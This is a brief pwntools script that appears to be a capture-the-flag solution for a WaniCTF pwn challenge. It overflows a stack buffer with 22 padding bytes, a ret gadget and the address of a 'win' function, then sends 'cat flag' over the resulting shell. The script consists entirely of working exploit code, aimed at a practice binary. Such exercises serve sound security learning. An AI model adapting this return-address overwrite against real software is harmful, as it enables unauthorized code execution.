from pwn import *
io = remote("ret.wanictf.org", 9005)
elf = ELF("./pwn05")
ret = 0x400696
#io = process("./pwn05")
pause()
s = "A" * 22 
s += p64(ret)
s += p64(elf.symbols['win'])

print(s)

io.send(s)

io.sendline("cat flag")
io.interactive()


